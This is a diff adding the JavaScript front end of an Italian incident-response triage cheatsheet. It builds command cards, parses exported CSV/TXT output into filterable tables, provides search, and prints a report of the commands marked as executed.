+      const theoryCol = document.createElement('div');
+      theoryCol.className = 'col-theory';
+      theoryCol.innerHTML = `<div class="col-head theory">📖 Teoria</div>`;
+      theoryCol.appendChild(buildTheoryCard(cat.theory));
+      cols.appendChild(theoryCol);
+    }
+
+    templates.push('1fr');
+    const detectCol = document.createElement('div');
+    detectCol.className = 'col-detect';
+    detectCol.innerHTML = `<div class="col-head detect">🔎 Individuazione</div>`;
+    cat.items.forEach((item, idx)=> detectCol.appendChild(buildItemCard(area, cat, item, idx, 'main')));
+    cols.appendChild(detectCol);
+
+    if (hasRem){
+      templates.push('1fr');
+      const remCol = document.createElement('div');
+      remCol.className = 'col-rem';
+      remCol.innerHTML = `<div class="col-head rem">⚠ Remediation</div>`;
+      cat.remediation.forEach((item, idx)=> remCol.appendChild(buildItemCard(area, cat, item, idx, 'rem')));
+      cols.appendChild(remCol);
+    }
+
+    cols.style.gridTemplateColumns = templates.join(' ');
+    section.appendChild(cols);
+    contentEl.appendChild(section);
+  });
+
+  setupScrollSpy(area);
+}
+
+/* Costruisce una singola card comando (individuazione o remediation) */
+function buildItemCard(area, cat, item, idx, kind){
+  const id = kind === 'rem' ? `${area}-${cat.id}-rem-${idx}` : `${area}-${cat.id}-${idx}`;
+  const domId = kind === 'rem' ? `item-rem-${area}-${cat.id}-${idx}` : `item-${area}-${cat.id}-${idx}`;
+  const card = document.createElement('div');
+  card.className = 'card' + (kind === 'rem' ? ' rem-card' : '') + (execState[id] ? ' done' : '');
+  card.id = domId;
+  card.innerHTML = `
+    <div class="card-head">
+      <label class="exec-label" title="Segna come eseguito">
+        <input type="checkbox" class="exec-check" data-id="${id}" ${execState[id] ? 'checked' : ''}>
+      </label>
+      ${area === 'linux' ? '' : `<span class="badge ${item.y}">${item.y}</span>`}
+      ${kind === 'rem' ? '<span class="badge rem">rem</span>' : ''}
+      <div class="card-title" title="${escapeHtml(item.t)}">${escapeHtml(item.t)}</div>
+    </div>
+    <div class="cmd-row">
+      <button class="copy-btn" data-area="${area}" data-cat="${cat.id}" data-idx="${idx}" data-kind="${kind}" title="Copia: incollando il comando in un terminale verrà eseguito automaticamente">
+        <span class="copy-icon">⧉</span><span class="copy-label">copia</span>
+      </button>
+      <pre class="code">${renderCommand(item.c)}</pre>
+      <textarea class="output-box" data-id="${id}" placeholder="+ output" title="Clicca per incollare l'output del comando">${escapeHtml(outputState[id] || '')}</textarea>
+    </div>
+  `;
+  return card;
+}
+
+/* Costruisce la card di teoria (percorsi + note) a partire da cat.theory */
+function buildTheoryCard(theory){
+  const card = document.createElement('div');
+  card.className = 'theory-card';
+  let html = '';
+  (theory.paths || []).forEach(p=>{
+    html += `<div class="theory-path-row"><div class="theory-path">${escapeHtml(p.p)}</div><div class="theory-desc">${escapeHtml(p.d)}</div></div>`;
+  });
+  (theory.notes || []).forEach(n=>{
+    html += `<div class="theory-note${n.warn ? ' warn' : ''}">${n.warn ? '⚠ ' : ''}${escapeHtml(n.text || n)}</div>`;
+  });
+  card.innerHTML = html;
+  return card;
+}
+
+function setupScrollSpy(area){
+  const sections = $$('.section');
+  const observer = new IntersectionObserver((entries)=>{
+    entries.forEach(entry=>{
+      if (entry.isIntersecting){
+        const catId = entry.target.id.split('-').slice(2).join('-');
+        $$('.cat-tab').forEach(t=> t.classList.toggle('active', t.dataset.cat === catId));
+        $('#breadcrumb').textContent = `root@triage:~/${area}/${catId}#`;
+      }
+    });
+  }, { rootMargin: '-150px 0px -70% 0px' });
+  sections.forEach(s=> observer.observe(s));
+}
+
+/* =========================================================
+   MODULO PARSING: upload file .csv/.txt esportati dai comandi della dashboard
+   ========================================================= */
+const PARSING_CATEGORIES = {
+  sysinfo: 'System Info',
+  process: 'Process',
+  connection: 'Connection',
+  persistence: 'Persistence',
+  services: 'Services',
+  tasks: 'Task Schedule',
+  suspdir: 'Suspicious Directory',
+  eventlog: 'Event Logs'
+};
+
+function buildParsingView(){
+  return `
+    <div class="parsing-view">
+      <label class="upload-box" for="fileUpload">
+        <span class="upload-title">📄 Seleziona un file .csv o .txt da analizzare</span>
+        <span class="upload-hint">Carica qui l'output esportato con i comandi "Esporta in CSV/TXT" presenti in ogni sezione (salvati in C:\\Windows\\Temp). I file con nome ircheatsheet_&lt;categoria&gt;_&lt;timestamp&gt; vengono riconosciuti automaticamente. I CSV sono mostrati come tabella filtrabile e ordinabile, i TXT come testo con filtro riga per riga.</span>
+        <input type="file" id="fileUpload" accept=".csv,.txt" hidden>
+      </label>
+      <div id="parsingFileInfo" class="parsing-file-info hidden"></div>
+      <div id="parsingOutput"></div>
+    </div>
+  `;
+}
+
+function attachParsingHandlers(){
+  const input = document.getElementById('fileUpload');
+  if (!input) return;
+  input.addEventListener('change', (e)=>{
+    const file = e.target.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = (ev)=>{
+      const text = String(ev.target.result);
+      const name = file.name;
+      const ext = name.split('.').pop().toLowerCase();
+      const infoEl = document.getElementById('parsingFileInfo');
+      const outputEl = document.getElementById('parsingOutput');
+
+      const m = name.match(/^ircheatsheet_([a-z]+)_\d{8}_\d{6}\.(csv|txt)$/i);
+      let label = null;
+      if (m && PARSING_CATEGORIES[m[1].toLowerCase()]){
+        label = PARSING_CATEGORIES[m[1].toLowerCase()];
+      }
+      infoEl.classList.remove('hidden');
+      infoEl.innerHTML = label
+        ? `Formato riconosciuto: <span class="tag-known">${escapeHtml(label)}</span> · ${escapeHtml(name)} · ${(file.size/1024).toFixed(1)} KB`
+        : `${escapeHtml(name)} · ${(file.size/1024).toFixed(1)} KB`;
+
+      if (ext === 'csv'){
+        const { headers, rows } = parseCSV(text);
+        outputEl.innerHTML = '<div class="table-wrap"></div>';
+        renderTable(headers, rows, outputEl.querySelector('.table-wrap'));
+      } else {
+        outputEl.innerHTML = '<div class="txt-wrap"></div>';
+        renderTxtViewer(text, outputEl.querySelector('.txt-wrap'));
+      }
+    };
+    reader.readAsText(file, 'utf-8');
+  });
+}
+
+/* Parser CSV conforme a RFC4180 (gestisce campi tra virgolette con virgole/newline interni) */
+function parseCSV(text){
+  const rows = [];
+  let row = [], field = '', inQuotes = false;
+  for (let i = 0; i < text.length; i++){
+    const c = text[i];
+    if (inQuotes){
+      if (c === '"'){
+        if (text[i+1] === '"'){ field += '"'; i++; }
+        else { inQuotes = false; }
+      } else { field += c; }
+    } else {
+      if (c === '"'){ inQuotes = true; }
+      else if (c === ','){ row.push(field); field = ''; }
+      else if (c === '\r'){ /* ignora, gestito su \n */ }
+      else if (c === '\n'){ row.push(field); rows.push(row); row = []; field = ''; }
+      else { field += c; }
+    }
+  }
+  if (field.length > 0 || row.length > 0){ row.push(field); rows.push(row); }
+  const nonEmpty = rows.filter(r => !(r.length === 1 && r[0] === ''));
+  const headers = nonEmpty[0] || [];
+  const dataRows = nonEmpty.slice(1);
+  return { headers, rows: dataRows };
+}
+
+function renderTable(headers, rows, container){
+  let sortCol = -1, sortAsc = true, filterText = '';
+
+  function draw(){
+    const filtered = filterText
+      ? rows.filter(r => r.some(cell => (cell || '').toLowerCase().includes(filterText)))
+      : rows;
+    let sorted = filtered;
+    if (sortCol >= 0){
+      sorted = [...filtered].sort((a,b)=>{
+        const av = a[sortCol] || '', bv = b[sortCol] || '';
+        const an = parseFloat(av), bn = parseFloat(bv);
+        let cmp;
+        if (!isNaN(an) && !isNaN(bn) && av.trim() !== '' && bv.trim() !== ''){ cmp = an - bn; }
+        else { cmp = av.localeCompare(bv); }
+        return sortAsc ? cmp : -cmp;
+      });
+    }
+    container.innerHTML = `
+      <div class="table-toolbar">
+        <input type="text" class="table-filter" placeholder="Filtra righe..." value="${escapeHtml(filterText)}">
+        <span class="table-count">${sorted.length} / ${rows.length} righe</span>
+      </div>
+      <div class="table-scroll">
+        <table class="data-table">
+          <thead><tr>${headers.map((h,i)=>`<th data-col="${i}">${escapeHtml(h)}${sortCol===i ? (sortAsc ? ' ▲' : ' ▼') : ''}</th>`).join('')}</tr></thead>
+          <tbody>${sorted.map(r=>`<tr>${headers.map((h,i)=>`<td title="${escapeHtml(r[i]||'')}">${escapeHtml(truncate(r[i]||'', 160))}</td>`).join('')}</tr>`).join('')}</tbody>
+        </table>
+      </div>
+    `;
+    const filterInput = container.querySelector('.table-filter');
+    filterInput.addEventListener('input', (e)=>{
+      const pos = e.target.selectionStart;
+      filterText = e.target.value.toLowerCase();
+      draw();
+      const newInput = container.querySelector('.table-filter');
+      newInput.focus();
+      newInput.setSelectionRange(pos, pos);
+    });
+    container.querySelectorAll('th').forEach(th=>{
+      th.addEventListener('click', ()=>{
+        const col = parseInt(th.dataset.col, 10);
+        if (sortCol === col){ sortAsc = !sortAsc; } else { sortCol = col; sortAsc = true; }
+        draw();
+      });
+    });
+  }
+  draw();
+}
+
+function highlightMatch(escapedLine, needle){
+  if (!needle) return escapedLine;
+  const lower = escapedLine.toLowerCase();
+  let result = '', i = 0;
+  while (true){
+    const idx = lower.indexOf(needle, i);
+    if (idx === -1){ result += escapedLine.slice(i); break; }
+    result += escapedLine.slice(i, idx) + '<mark>' + escapedLine.slice(idx, idx + needle.length) + '</mark>';
+    i = idx + needle.length;
+  }
+  return result;
+}
+
+function renderTxtViewer(text, container){
+  const lines = text.split(/\r\n|\n/);
+  let filterText = '';
+
+  function draw(){
+    const filtered = filterText
+      ? lines.filter(l => l.toLowerCase().includes(filterText))
+      : lines;
+    container.innerHTML = `
+      <div class="table-toolbar">
+        <input type="text" class="txt-filter" placeholder="Filtra righe (come un grep)..." value="${escapeHtml(filterText)}">
+        <span class="table-count">${filtered.length} / ${lines.length} righe</span>
+      </div>
+      <pre class="txt-viewer">${filtered.map(l => highlightMatch(escapeHtml(l), filterText)).join('\n')}</pre>
+    `;
+    const filterInput = container.querySelector('.txt-filter');
+    filterInput.addEventListener('input', (e)=>{
+      const pos = e.target.selectionStart;
+      filterText = e.target.value.toLowerCase();
+      draw();
+      const newInput = container.querySelector('.txt-filter');
+      newInput.focus();
+      newInput.setSelectionRange(pos, pos);
+    });
+  }
+  draw();
+}
+
+/* copia negli appunti con "paste-to-execute": viene aggiunto un a-capo finale così che,
+   incollando il comando in un terminale (cmd/PowerShell/bash), venga anche eseguito. */
+document.addEventListener('click', (e)=>{
+  const btn = e.target.closest('.copy-btn');
+  if (!btn) return;
+  const { area, cat, idx, kind } = btn.dataset;
+  const catObj = DATA[area].find(c=>c.id===cat);
+  const rawCommand = (kind === 'rem' ? catObj.remediation : catObj.items)[idx].c;
+  const eol = area === 'windows' ? '\r\n' : '\n';
+  const text = rawCommand + eol;
+
+  function markCopied(){
+    btn.classList.add('copied');
+    const icon = btn.querySelector('.copy-icon');
+    const orig = icon.textContent;
+    icon.textContent = '✓';
+    setTimeout(()=>{ icon.textContent = orig; btn.classList.remove('copied'); }, 1400);
+  }
+
+  if (navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(text).then(markCopied).catch(()=> fallbackCopy(text, markCopied));
+  } else {
+    fallbackCopy(text, markCopied);
+  }
+});
+
+function fallbackCopy(text, cb){
+  const ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.position = 'fixed';
+  ta.style.opacity = '0';
+  document.body.appendChild(ta);
+  ta.select();
+  try{ document.execCommand('copy'); }catch(e){}
+  document.body.removeChild(ta);
+  if (cb) cb();
+}
+
+/* =========================================================
+   SELEZIONE AREA (overlay + tabs)
+   ========================================================= */
+function selectArea(area){
+  renderArea(area);
+  $('#overlay').classList.add('hidden');
+}
+
+$$('.area-btn').forEach(btn=>{
+  btn.addEventListener('click', ()=> selectArea(btn.dataset.area));
+});
+$$('.area-tab').forEach(btn=>{
+  btn.addEventListener('click', ()=> renderArea(btn.dataset.area));
+});
+
+/* =========================================================
+   RICERCA GLOBALE
+   ========================================================= */
+function buildIndex(){
+  const idx = [];
+  ['windows','linux'].forEach(area=>{
+    DATA[area].forEach(cat=>{
+      cat.items.forEach((item, i)=>{
+        idx.push({ area, catId:cat.id, catName:cat.name, idx:i, title:item.t, type:item.y, command:item.c, kind:'main' });
+      });
+      (cat.remediation||[]).forEach((item, i)=>{
+        idx.push({ area, catId:cat.id, catName:cat.name+' · Remediation', idx:i, title:item.t, type:item.y, command:item.c, kind:'rem' });
+      });
+    });
+  });
+  return idx;
+}
+const SEARCH_INDEX = buildIndex();
+
+const searchInput = $('#searchInput');
+const searchResults = $('#searchResults');
+
+searchInput.addEventListener('input', ()=>{
+  const q = searchInput.value.trim().toLowerCase();
+  if (q.length < 3){
+    searchResults.classList.add('hidden');
+    searchResults.innerHTML = '';
+    return;
+  }
+  const matches = SEARCH_INDEX.filter(e=>
+    e.title.toLowerCase().includes(q) ||
+    e.command.toLowerCase().includes(q) ||
+    e.catName.toLowerCase().includes(q)
+  ).slice(0, 30);
+
+  searchResults.innerHTML = '';
+  if (matches.length === 0){
+    searchResults.innerHTML = `<div class="sr-empty">Nessun comando trovato per "${escapeHtml(searchInput.value)}"</div>`;
+  } else {
+    matches.forEach(m=>{
+      const row = document.createElement('button');
+      row.className = 'sr-item';
+      row.innerHTML = `
+        <div class="sr-title">${escapeHtml(m.title)}</div>
+        <div class="sr-meta"><span class="tag">${m.area}</span> · ${escapeHtml(m.catName)} · ${m.type}</div>
+      `;
+      row.addEventListener('click', ()=> goToResult(m));
+      searchResults.appendChild(row);
+    });
+  }
+  searchResults.classList.remove('hidden');
+});
+
+document.addEventListener('click', (e)=>{
+  if (!e.target.closest('.search-wrap')){
+    searchResults.classList.add('hidden');
+  }
+});
+
+function goToResult(m){
+  searchResults.classList.add('hidden');
+  searchInput.value = '';
+  if (state.area !== m.area){
+    renderArea(m.area);
+  }
+  requestAnimationFrame(()=>{
+    setTimeout(()=>{
+      const cardId = m.kind === 'rem' ? `item-rem-${m.area}-${m.catId}-${m.idx}` : `item-${m.area}-${m.catId}-${m.idx}`;
+      const card = document.getElementById(cardId);
+      if (card){
+        card.scrollIntoView({behavior:'smooth', block:'center'});
+        card.classList.add('flash');
+        setTimeout(()=> card.classList.remove('flash'), 1600);
+      }
+    }, 60);
+  });
+}
+
+/* =========================================================
+   TORNA IN CIMA
+   ========================================================= */
+const backToTopBtn = $('#backToTop');
+window.addEventListener('scroll', ()=>{
+  backToTopBtn.classList.toggle('visible', window.scrollY > 400);
+});
+backToTopBtn.addEventListener('click', ()=>{
+  window.scrollTo({ top:0, behavior:'smooth' });
+});
+
+/* =========================================================
+   REPORT DI STAMPA: elenca i comandi segnati come eseguiti con il relativo output
+   ========================================================= */
+function buildReportHTML(){
+  const executed = [];
+  ['windows','linux'].forEach(area=>{
+    DATA[area].forEach(cat=>{
+      cat.items.forEach((item, idx)=>{
+        const id = `${area}-${cat.id}-${idx}`;
+        if (execState[id]){
+          executed.push({ area, catName: cat.name, item, output: outputState[id] || '' });
+        }
+      });
+      (cat.remediation||[]).forEach((item, idx)=>{
+        const id = `${area}-${cat.id}-rem-${idx}`;
+        if (execState[id]){
+          executed.push({ area, catName: cat.name+' · Remediation', item, output: outputState[id] || '' });
+        }
+      });
+    });
+  });
+
+  if (executed.length === 0){
+    return `<div class="report-empty">Nessun comando segnato come eseguito. Spunta la checklist accanto ai comandi da includere nel report prima di stamparlo.</div>`;
+  }
+
+  const rows = executed.map(e => `
+    <div class="report-item">
+      <div class="report-item-head">${escapeHtml(e.area)} · ${escapeHtml(e.catName)} · ${e.item.y}</div>
+      <div class="report-title">${escapeHtml(e.item.t)}</div>
+      <pre class="report-cmd">${escapeHtml(e.item.c)}</pre>
+      <div class="report-output-label">Output:</div>
+      <pre class="report-output">${e.output.trim() ? escapeHtml(e.output) : '(nessun output incollato)'}</pre>
+    </div>
+  `).join('');
+
+  return `
+    <h1>IR-Cheatsheet — Report di triage</h1>
+    <div class="report-meta">Generato il ${new Date().toLocaleString('it-IT')} · ${executed.length} comandi eseguiti</div>
+    ${rows}
+  `;
+}
+
+$('#reportBtn').addEventListener('click', ()=>{
+  $('#printReport').innerHTML = buildReportHTML();
+  window.print();
+});
+
+/* =========================================================
+   INIT
+   ========================================================= */
+initTheme();
+</script>
+</body>
+</html>
